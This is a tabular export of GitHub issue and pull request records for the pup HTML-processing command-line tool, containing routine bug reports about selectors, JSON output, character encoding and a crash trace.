ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/115,429606376,MDU6SXNzdWU0Mjk2MDYzNzY=,115,Tried on Msys2/mingw64 without error but the 'pup' unrecognized,25836673,open,FALSE,NA,NA,1,2019-04-05T06:45:55Z,2021-04-06T05:41:05Z,NA,NONE,NA,"I tried to get it on Msys2/mingw64 without error :
`$ go get github.com/ericchiang/pup`

but
```
$ pup
bash: pup: command not found
```
Any experience use on msys2 ?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/115/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/115/comments,https://api.github.com/repos/ericchiang/pup/issues/115/events,https://github.com/ericchiang/pup/issues/115,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/114,428962243,MDU6SXNzdWU0Mjg5NjIyNDM=,114,"Doesnt handle tags with ""-"" (hyphen) in it",173044,open,FALSE,NA,NA,0,2019-04-03T20:33:57Z,2019-04-03T20:33:57Z,NA,NONE,NA,"Pug doesnt handle tags with hyphen in it.

For instance, this [page](https://www.newyorker.com/news/current/mark-zuckerberg-announces-facebooks-pivot-to-privacy/amp) is AMP and has tags such as `amp-img`, `amp-analytics` in it.

```bash
$ curl https://www.newyorker.com/news/current/mark-zuckerberg-announces-facebooks-pivot-to-privacy/amp | grep amp-img
# shows results
```

However `pup` doesnt recognize them
```bash
$ curl https://www.newyorker.com/news/current/mark-zuckerberg-announces-facebooks-pivot-to-privacy/amp | pup 'amp-img'
# Nothing
```

Here's a simpler test case - 
```bash
$ echo ""<html><h1>foo</h1><foo-bar>hi there</foo-bar></html>"" | pup 'body'
<body>
 <h1>
  foo
 </h1>
 <foo-bar>
  hi there
 </foo-bar>
</body>
```

```bash
$ echo ""<html><h1>foo</h1><foo-bar>hi there</foo-bar></html>"" | pup 'foo-bar'
# nothing
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/114/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/114/comments,https://api.github.com/repos/ericchiang/pup/issues/114/events,https://github.com/ericchiang/pup/issues/114,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/113,424255414,MDU6SXNzdWU0MjQyNTU0MTQ=,113,json{} discards ordering of text elements,160894,closed,FALSE,NA,NA,1,2019-03-22T15:05:46Z,2019-03-22T15:18:38Z,2019-03-22T15:18:38Z,NONE,NA,"Given this HTML:

```html
Key 1: <b>Value 1</b>
Key 2: <b>Value 2</b>
Key 3: <b>Value 3</b>
```

pup `json{}` outputs:

```json
{
 ""children"": [
  {
   ""tag"": ""b"",
   ""text"": ""Value 1""
  },
  {
   ""tag"": ""b"",
   ""text"": ""Value 2""
  },
  {
   ""tag"": ""b"",
   ""text"": ""Value 3""
  }
 ],
 ""text"": ""Key 1: Key 2: Key 3:""
}
```

This loses information and cannot be reliably parsed.
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/113/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/113/comments,https://api.github.com/repos/ericchiang/pup/issues/113/events,https://github.com/ericchiang/pup/issues/113,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/112,415528327,MDExOlB1bGxSZXF1ZXN0MjU2OTkzOTkw,112,Add FreeBSD installation instructions,7978161,open,FALSE,NA,NA,0,2019-02-28T09:35:48Z,2019-02-28T09:35:48Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/112/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/112/comments,https://api.github.com/repos/ericchiang/pup/issues/112/events,https://github.com/ericchiang/pup/pull/112,https://api.github.com/repos/ericchiang/pup/pulls/112
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/111,413736991,MDExOlB1bGxSZXF1ZXN0MjU1NjM3OTY1,111,Preserving sibling relationship of all node types,3359229,open,FALSE,NA,NA,0,2019-02-23T20:35:15Z,2019-03-17T22:27:06Z,NA,NONE,NA,fixes https://github.com/ericchiang/pup/issues/110,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/111/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/111/comments,https://api.github.com/repos/ericchiang/pup/issues/111/events,https://github.com/ericchiang/pup/pull/111,https://api.github.com/repos/ericchiang/pup/pulls/111
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/110,413736807,MDU6SXNzdWU0MTM3MzY4MDc=,110,Provide a more faithful json mapping of html sibling nodes of mixed types,3359229,open,FALSE,NA,NA,1,2019-02-23T20:33:26Z,2021-02-12T00:38:57Z,NA,NONE,NA,"Currently, the `json{}` displayer comines all text node children of an element node together (separated by spaces)

```bash
# echo '<div><span>a</span>1<span>b</span>2 3</div>' | pup 'div json{}'
[
 {
  ""children"": [
   {
    ""tag"": ""span"",
    ""text"": ""a""
   },
   {
    ""tag"": ""span"",
    ""text"": ""b""
   }
  ],
  ""tag"": ""div"",
  ""text"": ""1 2 3""
 }
]
```

This produces the same output as a different html document
```bash
# echo '<div><span>a</span>1 2<span>b</span>3</div>' | pup 'div json{}'
[
 {
  ""children"": [
   {
    ""tag"": ""span"",
    ""text"": ""a""
   },
   {
    ""tag"": ""span"",
    ""text"": ""b""
   }
  ],
  ""tag"": ""div"",
  ""text"": ""1 2 3""
 }
]
```

I would like the json output to preserve the distinction between these documents. For example,

```bash
# echo '<div><span>a</span>1<span>b</span>2 3</div>' | pup 'div json{}'
[
 {
  ""children"": [
   {
    ""children"": [
     {
      ""text"": ""a""
     }
    ],
    ""tag"": ""span""
   },
   {
    ""text"": ""1""
   },
   {
    ""children"": [
     {
      ""text"": ""b""
     }
    ],
    ""tag"": ""span""
   },
   {
    ""text"": ""2 3""
   }
  ],
  ""tag"": ""div""
 }
]

# echo '<div><span>a</span>1 2<span>b</span>3</div>' | pup 'div json{}'
[
 {
  ""children"": [
   {
    ""children"": [
     {
      ""text"": ""a""
     }
    ],
    ""tag"": ""span""
   },
   {
    ""text"": ""1 2""
   },
   {
    ""children"": [
     {
      ""text"": ""b""
     }
    ],
    ""tag"": ""span""
   },
   {
    ""text"": ""3""
   }
  ],
  ""tag"": ""div""
 }
]
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/110/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/110/comments,https://api.github.com/repos/ericchiang/pup/issues/110/events,https://github.com/ericchiang/pup/issues/110,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/109,413735717,MDExOlB1bGxSZXF1ZXN0MjU1NjM3Mjk3,109,Move node attributes under their own key in JSON displayer,3359229,open,FALSE,NA,NA,0,2019-02-23T20:22:53Z,2019-02-23T20:46:07Z,NA,NONE,NA,"fixes https://github.com/ericchiang/pup/issues/108
fixes https://github.com/ericchiang/pup/issues/80

this breaks how json is displayed",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/109/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/109/comments,https://api.github.com/repos/ericchiang/pup/issues/109/events,https://github.com/ericchiang/pup/pull/109,https://api.github.com/repos/ericchiang/pup/pulls/109
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/108,413734061,MDU6SXNzdWU0MTM3MzQwNjE=,108,Move attributes underneath a subobject when displaying json{},3359229,open,FALSE,NA,NA,0,2019-02-23T20:06:18Z,2019-02-23T20:06:18Z,NA,NONE,NA,"When using the `json{}` displayer, if an attribute name is `tag`, `text`, you get misleading results:

```bash
# echo '<div tag=""hello"">world</div>' |./pup 'div json{}'
[
 {
  ""tag"": ""div"",
  ""text"": ""world""
 }
]
```
`tag=hello` attribute has disappeared

```bash
# echo '<div text=""hello"">world</div>' |./pup 'div json{}'
[
 {
  ""tag"": ""div"",
  ""text"": ""hello world""
 }
]
```
`text=hello` attribute has been appended to text

Both these issues can be solved by giving attributes their own object underneath the node object

```bash
# echo '<div tag=""hello"">world</div>' |./pup 'div json{}'
[
 {
  ""attrs"": {
   ""tag"": ""hello""
  },
  ""tag"": ""div"",
  ""text"": ""world""
 }
]
# echo '<div text=""hello"">world</div>' |./pup 'div json{}'
[
 {
  ""attrs"": {
   ""text"": ""hello""
  },
  ""tag"": ""div"",
  ""text"": ""world""
 }
]
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/108/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/108/comments,https://api.github.com/repos/ericchiang/pup/issues/108/events,https://github.com/ericchiang/pup/issues/108,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/107,413530222,MDExOlB1bGxSZXF1ZXN0MjU1NDk0MDUx,107,Support unknown tag selectors,3359229,open,FALSE,NA,NA,2,2019-02-22T18:45:39Z,2020-08-30T03:48:44Z,NA,NONE,NA,"See https://godoc.org/golang.org/x/net/html#Node for more information

fixes https://github.com/ericchiang/pup/issues/93",NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/107/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/107/comments,https://api.github.com/repos/ericchiang/pup/issues/107/events,https://github.com/ericchiang/pup/pull/107,https://api.github.com/repos/ericchiang/pup/pulls/107
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/106,413457784,MDU6SXNzdWU0MTM0NTc3ODQ=,106,tag:contains doesn't print anything?,266306,open,FALSE,NA,NA,0,2019-02-22T15:37:39Z,2019-02-22T15:37:39Z,NA,NONE,NA,"Input:

```
<start>
   <header>
      This is header section
   </header>
   <body>
      <body_start>
         This is body section
         <a>
            <b>
               <c>
                  <st>111</st>
               </c>
               <d>
                  <st>blank</st>
               </d>
            </b>
         </a>
      </body_start>
      <body_section>
         This is body section
         <a>
            <b>
               <c>
                  <st>5</st>
               </c>
               <d>
                  <st>666</st>
               </d>
            </b>
            <b>
               <c>
                  <st>154</st>
               </c>
               <d>
                  <st>1457954</st>
               </d>
            </b>
            <b>
               <c>
                  <st>845034</st>
               </c>
               <d>
                  <st>blank</st>
               </d>
            </b>
         </a>
      </body_section>
   </body>
</start>
```

Command:

`pup 'st:contains(""154"")' <file.html`

The above commands prints nothing. I expect to print all `st` tags which got value `154` in it.

Although this works fine:

```
$ pup ':contains(""154"")' <file.html
<st>
 154
</st>
```

What I'm missing?

I'm using `pup`: 0.4.0.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/106/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/106/comments,https://api.github.com/repos/ericchiang/pup/issues/106/events,https://github.com/ericchiang/pup/issues/106,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/105,397627102,MDU6SXNzdWUzOTc2MjcxMDI=,105,"How to print the text from a ""dd"" that comes after a dt with a span with a particular class and body content?",5566419,open,FALSE,NA,NA,2,2019-01-10T00:48:53Z,2020-02-01T05:21:43Z,NA,NONE,NA,"So let's say that I wanted to parse through javadoc output files, looking for blocks like this:

```
<dl>
<dt><span class=""simpleTagLabel"">Since:</span></dt>
<dd>1.8</dd>
</dl>
```
And I want to get the ""1.8"" text.  Is there some combination of pup css selectors that could do this?

I'm not an expert on css selectors, but I tried the following: `pup 'dt>span.simpleTagLabel , dd text{}'`, but this gets much more than what I'm looking for.",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/105/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/105/comments,https://api.github.com/repos/ericchiang/pup/issues/105/events,https://github.com/ericchiang/pup/issues/105,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/104,368374856,MDU6SXNzdWUzNjgzNzQ4NTY=,104,Output wrong block,29659370,open,FALSE,NA,NA,0,2018-10-09T20:05:58Z,2018-10-09T20:07:23Z,NA,NONE,NA,"Hi. When I'm trying parse html code:


```
<div class=""object3"">
--
  | <div class=""foto"">
  | <a href=""/zzzzzzzzzzzzzzzzzzzz"">
  | <img src=""/picture/345/m/1051530/zzzzzzzzzzzzzzzz.jpeg""  alt=""zzzzzzzzzzzzzzz"" title=""""/>
  | </a>
  |  
  | <div class=""boxBottom"">
  | <p>&#8364; 3.450</p>
  | </div>
  |  
  | <div class=""boxBottom boxBottomExport"">
  | export price<br>
  | <p class=""exportprijs"">&#8364; 2.950</p>
  | </div>
```

I run this code:
```
curl -s -L https://zzzzzzzzzzzzz.yyyyyyyyyyyyyyyyyyy \
| ./pup 'div.object3 div.foto div.boxBottom p'
```
and I got 2 output:
`<p>&#8364; 3.450</p> and <p_class=""exportprijs""> &#8364; 2.950 </p>`
, but I need only:
`<p>&#8364; 3.450</p>`

Can we ignore `<p class=""exportprijs"">&#8364; 2.950</p>` ?
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/104/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/104/comments,https://api.github.com/repos/ericchiang/pup/issues/104/events,https://github.com/ericchiang/pup/issues/104,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/103,366205556,MDU6SXNzdWUzNjYyMDU1NTY=,103,Does pup change the hierarchical structure?,30607,closed,FALSE,NA,NA,1,2018-10-03T07:19:48Z,2018-10-03T09:41:44Z,2018-10-03T09:41:43Z,NONE,NA,"Hi,
I have this xml file https://harrywood.co.uk/maps/examples/openlayers/display-osm/display-osm.osm

```xml
<?xml version='1.0' encoding='UTF-8'?>
<osm version='0.6' generator='JOSM'>
  <bounds minlat='34.0662408634219' minlon='-118.736715316772' maxlat='34.0731374116421' maxlon='-118.73122215271' origin='OpenStreetMap server' />
  <node id='358802885' timestamp='2009-03-11T06:30:08Z' user='yellowbkpk' visible='true' version='1' lat='34.0666735' lon='-118.734254'>
    <tag k='gnis:created' v='06/14/2000' />
    <tag k='gnis:county_id' v='037' />
    <tag k='name' v='Santa Monica Mountains National Recreation Area' />
    <tag k='leisure' v='park' />
    <tag k='gnis:feature_id' v='277263' />
    <tag k='gnis:state_id' v='06' />
    <tag k='ele' v='243' />
  </node>
  <node id='453966480' timestamp='2009-08-02T03:36:00Z' user='Apo42' visible='true' version='1' lat='34.07234' lon='-118.7343501' />
  <node id='453966482' timestamp='2009-08-02T03:36:01Z' user='Apo42' visible='true' version='1' lat='34.0670965' lon='-118.7322253' />
  <node id='453966143' timestamp='2009-08-02T03:35:45Z' user='Apo42' visible='true' version='1' lat='34.0724577' lon='-118.7364799' />
  <node id='453966130' timestamp='2009-08-02T03:35:44Z' user='Apo42' visible='true' version='1' lat='34.0671122' lon='-118.7364725' />
  <node id='453966490' timestamp='2009-08-02T03:36:02Z' user='Apo42' visible='true' version='1' lat='34.0722227' lon='-118.7322321' />
  <way id='38407529' timestamp='2009-08-02T03:37:41Z' user='Apo42' visible='true' version='1'>
    <nd ref='453966480' />
    <nd ref='453966490' />
    <nd ref='453966482' />
    <nd ref='453966130' />
    <nd ref='453966143' />
    <nd ref='453966480' />
    <tag k='park:type' v='state_park' />
    <tag k='csp:unitcode' v='537' />
    <tag k='admin_level' v='4' />
    <tag k='name' v='Malibu Creek State Park' />
    <tag k='csp:globalid' v='{4A422954-089E-407F-A5B3-1E808F830EAA}' />
    <tag k='leisure' v='park' />
    <tag k='attribution' v='CASIL CSP_Opbdys072008' />
    <tag k='note' v='simplified with josm to reduce node #' />
    <tag k='boundary' v='national_park' />
  </way>
</osm>
```

It has this structure, node items are brothers:

![image](https://user-images.githubusercontent.com/30607/46395501-db61c780-c6ec-11e8-8f21-9164937a21f7.png)

If I use pup with

    curl -sL ""https://harrywood.co.uk/maps/examples/openlayers/display-osm/display-osm.osm"" | pup

I have a different hierarchical structure (as below), a node item is parent of other node. It seems to me a problem, not a good thing. 
Is there some error of mine?

Thank you

![image](https://user-images.githubusercontent.com/30607/46395597-22e85380-c6ed-11e8-9ac6-2d90534b1e0d.png)
",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/103/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/103/comments,https://api.github.com/repos/ericchiang/pup/issues/103/events,https://github.com/ericchiang/pup/issues/103,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/102,360571136,MDExOlB1bGxSZXF1ZXN0MjE1Nzg2Nzcx,102,intent -> indent in README.md,228695,open,FALSE,NA,NA,0,2018-09-15T19:59:18Z,2018-09-15T19:59:38Z,NA,NONE,NA,,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/102/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/102/comments,https://api.github.com/repos/ericchiang/pup/issues/102/events,https://github.com/ericchiang/pup/pull/102,https://api.github.com/repos/ericchiang/pup/pulls/102
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/101,360222337,MDU6SXNzdWUzNjAyMjIzMzc=,101,pup and char encoding,30607,closed,FALSE,NA,NA,1,2018-09-14T09:15:36Z,2018-09-14T09:17:15Z,2018-09-14T09:17:14Z,NONE,NA,"Hi,
if I run

    curl ""http://www.consulentipubblici.gov.it/ElencoDip.aspx?ANNO=2018&ENTE=AMM_r_sicili&SOGGETTO="" | pup '#tblSearch > tbody > tr json{}' | jq '.[].children[].text'

In example

```
""9.000,00 â‚¬""
""35.000,00 â‚¬""
```

I have in output a lot of wrong chars. The source page is utf-8 encoded. How to set pup to read and render proberly chars encoding?

Thank you",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/101/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/101/comments,https://api.github.com/repos/ericchiang/pup/issues/101/events,https://github.com/ericchiang/pup/issues/101,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/100,351226573,MDU6SXNzdWUzNTEyMjY1NzM=,100,support install by scoop?,4343900,open,FALSE,NA,NA,1,2018-08-16T14:19:41Z,2018-09-11T18:40:43Z,NA,NONE,NA,,NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/100/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/100/comments,https://api.github.com/repos/ericchiang/pup/issues/100/events,https://github.com/ericchiang/pup/issues/100,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/99,329396391,MDU6SXNzdWUzMjkzOTYzOTE=,99,fatal error macOS Sierra 10.12.6,29747992,open,FALSE,NA,NA,0,2018-06-05T10:32:16Z,2018-06-05T10:32:16Z,NA,NONE,NA,"Receiving fatal error on [23rd, 42nd, 105th] cycle of the loop in this code:

`while read url
do
LINK=""http://www.webpage.com/$url""
curl -s ""$LINK"" | pup '#bodyBack.col-sm-12.col-xs-12.col-md-12.padding-zero.search-result.no-focus div.col-sm-12.col-xs-12.col-md-12.padding-zero.no-focus div.col-sm-8.col-xs-12.unit-details.padding-zero.no-focus div.unit-row.margin-bottom-small.col-sm-12.col-xs-12.padding-zero.no-focus a.primary-anchor-small.no-focus:contains(""Location"") attr{href}' >> $url.location.txt
mv $url.location.txt $RNAME/location/$url.location.txt
#echo ""$url.json Created for:""
cat $RNAME/location/$url.location.txt
printf ""%s\n\n"" ""$url.location.txt Created""
done < $RNAME/$RNAME.IDlist.txt
cd $RNAME/location
echo ""location Files Added:""
ls -1 | wc -l
echo ""Out of:""
echo $RNUMBER`




**Error Below:**

fatal error: unexpected signal during runtime execution
[signal 0xb code=0x1 addr=0x177733eaae54 pc=0x1d83b]

runtime stack:
runtime.throw(0x246e20, 0x2a)
	/usr/local/go/src/runtime/panic.go:547 +0x90
runtime.sigpanic()
	/usr/local/go/src/runtime/sigpanic_unix.go:12 +0x5a
runtime.unlock(0x3ca600)
	/usr/local/go/src/runtime/lock_sema.go:107 +0x14b
runtime.(*mheap).alloc_m(0x3ca600, 0x1, 0xd, 0x485120)
	/usr/local/go/src/runtime/mheap.go:492 +0x314
runtime.(*mheap).alloc.func1()
	/usr/local/go/src/runtime/mheap.go:502 +0x41
runtime.systemstack(0x7fff5fbff8d8)
	/usr/local/go/src/runtime/asm_amd64.s:307 +0xab
runtime.(*mheap).alloc(0x3ca600, 0x1, 0x1000000000d, 0x1d4df)
	/usr/local/go/src/runtime/mheap.go:503 +0x63
runtime.(*mcentral).grow(0x3cbe80, 0x0)
	/usr/local/go/src/runtime/mcentral.go:209 +0x93
runtime.(*mcentral).cacheSpan(0x3cbe80, 0xc820010130)
	/usr/local/go/src/runtime/mcentral.go:89 +0x47d
runtime.(*mcache).refill(0x42f000, 0xd, 0xc820010100)
	/usr/local/go/src/runtime/mcache.go:119 +0xcc
runtime.mallocgc.func2()
	/usr/local/go/src/runtime/malloc.go:642 +0x2b
runtime.systemstack(0x3c7200)
	/usr/local/go/src/runtime/asm_amd64.s:291 +0x79
runtime.mstart()
	/usr/local/go/src/runtime/proc.go:1051

goroutine 1 [running]:
runtime.systemstack_switch()
	/usr/local/go/src/runtime/asm_amd64.s:245 fp=0xc8200338c0 sp=0xc8200338b8
runtime.mallocgc(0xc0, 0x1caa60, 0x0, 0xc8201e0890)
	/usr/local/go/src/runtime/malloc.go:643 +0x869 fp=0xc820033998 sp=0xc8200338c0
runtime.newarray(0x1caa60, 0x4, 0xc8201e0890)
	/usr/local/go/src/runtime/malloc.go:798 +0xc9 fp=0xc8200339d8 sp=0xc820033998
runtime.growslice(0x16b5a0, 0xc8201eac60, 0x2, 0x2, 0x3, 0x0, 0x0, 0x0)
	/usr/local/go/src/runtime/slice.go:100 +0x2c1 fp=0xc820033a48 sp=0xc8200339d8
github.com/ericchiang/pup/vendor/golang.org/x/net/html.(*Tokenizer).Token(0xc820056dd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/token.go:1176 +0x4b1 fp=0xc820033b68 sp=0xc820033a48
github.com/ericchiang/pup/vendor/golang.org/x/net/html.(*parser).parse(0xc8200a9c30, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/parse.go:2002 +0xe6 fp=0xc820033c10 sp=0xc820033b68
github.com/ericchiang/pup/vendor/golang.org/x/net/html.Parse(0x4837a8, 0xc8200ea000, 0x0, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/vendor/golang.org/x/net/html/parse.go:2026 +0x127 fp=0xc820033c48 sp=0xc820033c10
main.ParseHTML(0x4837a8, 0xc8200ea000, 0x0, 0x0, 0xc820026008, 0x0, 0x0)
	/go/src/github.com/ericchiang/pup/parse.go:43 +0xdf fp=0xc820033d28 sp=0xc820033c48
main.main()
	/go/src/github.com/ericchiang/pup/pup.go:30 +0x229 fp=0xc820033f50 sp=0xc820033d28
runtime.main()
	/usr/local/go/src/runtime/proc.go:188 +0x2b0 fp=0xc820033fa0 sp=0xc820033f50
runtime.goexit()
	/usr/local/go/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc820033fa8 sp=0xc820033fa0",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/99/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/99/comments,https://api.github.com/repos/ericchiang/pup/issues/99/events,https://github.com/ericchiang/pup/issues/99,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/98,323737775,MDU6SXNzdWUzMjM3Mzc3NzU=,98,--color output is not useful for colorblind folks,1323808,open,FALSE,NA,NA,0,2018-05-16T18:34:23Z,2018-05-16T18:34:23Z,NA,NONE,NA,The output of `pup --color` is not very useful to colorblind folks. Try peeking at it through http://colororacle.org/. Also http://paletton.com/ has a simulator.,NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/98/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/98/comments,https://api.github.com/repos/ericchiang/pup/issues/98/events,https://github.com/ericchiang/pup/issues/98,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/97,320569495,MDU6SXNzdWUzMjA1Njk0OTU=,97,Really weird unicode issue.,35904,open,FALSE,NA,NA,0,2018-05-06T07:22:24Z,2018-05-06T07:22:24Z,NA,NONE,NA,"Given this source:

```

<!DOCTYPE html>

<html lang=""en"" data-placeholder-focus=""false"">
<head>
<title>Abrir Conjugation | Conjugate Abrir in Spanish
</title>
<script type=""text/javascript"" class="""">
</script>
</head>
<body data-datetime=""2018-05-06T07:09:41+00:00"" data-is-mobile=""false"" data-asset-host=""https://n1.global.ssl.fastly.net"" class=""lang-en"">
  <table>
<td class=""vtable-word"">
<div class=""vtable-word-contents"">
<div data-toggle=""tooltip"" data-tense=""presentIndicative"" data-person=""0"" class=""vtable-word-text"" data-original-title=""I open"">abro
</div>
<a href=""https://audio1.spanishdict.com/audio?lang=es&amp;text=abro&amp;key=acd1f6ce3d37afd9afeaeae5896039f1"" data-toggle=""tooltip"" title=""Listen to an audio pronunciation"" class=""audio-start js-audio-refresh"">
<span class=""audio-blue-small"">
</span>
</a>
</div>
</td>
<td class=""vtable-word"">
<div class=""vtable-word-contents"">
<div data-toggle=""tooltip"" data-tense=""futureIndicative"" data-person=""5"" class=""vtable-word-text"" data-original-title=""they will open"">abrirán
</div>
<a href=""https://audio1.spanishdict.com/audio?lang=es&amp;text=abrir%C3%A1n&amp;key=0b2af1c0c7d2896680091e1af80ba594"" data-toggle=""tooltip"" title=""Listen to an audio pronunciation"" class=""audio-start js-audio-refresh"">
<span class=""audio-blue-small"">
</span>
</a>
</div>
</td>
</tr>
</tbody>
</table>
</body>
</html>
```
, piping it through pup with no commands at all gives, amongst other output:

```
     <td class=""vtable-word"">
      <div class=""vtable-word-contents"">
       <div data-toggle=""tooltip"" data-tense=""futureIndicative"" data-person=""5"" class=""vtable-word-text"" data-original-title=""they will open"">
        abrirÃ¡n
       </div>
```

If I make *any* changes to that source file at all, though, that text is correctly rendered as ""abrirán""",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/97/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/97/comments,https://api.github.com/repos/ericchiang/pup/issues/97/events,https://github.com/ericchiang/pup/issues/97,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/96,313792053,MDU6SXNzdWUzMTM3OTIwNTM=,96,Return inner HTML,266306,open,FALSE,NA,NA,2,2018-04-12T16:04:13Z,2021-01-31T15:37:07Z,NA,NONE,NA,"I've the following command:

    pup -f <(curl -sL https://www.iana.org/) tr text{}

however `text{}` removes all the inner tags. Is there any way to extract the inner HTML instead?",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/96/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/96/comments,https://api.github.com/repos/ericchiang/pup/issues/96/events,https://github.com/ericchiang/pup/issues/96,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/95,301838542,MDU6SXNzdWUzMDE4Mzg1NDI=,95,HTML entities not decoded,308610,closed,FALSE,NA,NA,1,2018-03-02T17:09:21Z,2018-03-02T17:10:12Z,2018-03-02T17:10:12Z,NONE,NA,"Consider this simple example:

```
$ echo '&#34;' | pup 'body text{}'
&#34;
```

I would expect pup to decode that entity to a quote character (`""`).

I encountered this issue when querying thus:

```
$ curl -s -X POST -d ""MySQLQuery=select+person+from+persons;"" -H ""Accept: application/json"" http://www.querymongo.com/ | pup 'textarea#mongoQuery text{}'
db.persons.find({}, {
    &#34;person&#34;: 1
});
```

I was hoping to get

```
db.persons.find({}, {
    ""person"": 1
});
```",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/95/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/95/comments,https://api.github.com/repos/ericchiang/pup/issues/95/events,https://github.com/ericchiang/pup/issues/95,NA
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/94,297576265,MDExOlB1bGxSZXF1ZXN0MTY5NDY5NTkw,94,Update README to reflect vanilla brew install,213281,open,FALSE,NA,NA,5,2018-02-15T19:55:49Z,2019-05-31T18:59:04Z,NA,NONE,NA,Fixes segfaulting installation issue in High Sierra a la: https://github.com/ericchiang/pup/issues/85,NA,TRUE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/94/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/94/comments,https://api.github.com/repos/ericchiang/pup/issues/94/events,https://github.com/ericchiang/pup/pull/94,https://api.github.com/repos/ericchiang/pup/pulls/94
ericchiang,pup,https://api.github.com/repos/ericchiang/pup/issues/93,293296810,MDU6SXNzdWUyOTMyOTY4MTA=,93,<main> tag not processed,264256,open,FALSE,NA,NA,5,2018-01-31T20:16:20Z,2020-10-28T13:15:18Z,NA,NONE,NA,"This HTML:

`echo '<div>something</div>' | pup 'div'`

Results in, as expected:

```
<div>
 something
</div>
```

This:

`echo '<main>something</main>' | pup 'main'`

Results in:

`Empty`

Expected:

```
<main>
 something
</main>
```

",NA,FALSE,https://api.github.com/repos/ericchiang/pup,https://api.github.com/repos/ericchiang/pup/issues/93/labels{/name},https://api.github.com/repos/ericchiang/pup/issues/93/comments,https://api.github.com/repos/ericchiang/pup/issues/93/events,https://github.com/ericchiang/pup/issues/93,NA
